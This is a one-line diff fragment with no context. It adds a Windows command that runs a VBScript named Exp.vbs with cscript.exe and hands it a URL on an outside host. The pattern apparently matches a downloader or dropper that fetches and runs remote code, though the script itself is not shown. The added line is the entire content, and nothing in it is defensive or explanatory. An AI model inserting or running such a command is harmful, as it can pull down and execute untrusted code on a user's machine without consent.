@@ -1,0 +1,1 @@
+Cscript.exe Exp.vbs http://wz001.51wxs.com/
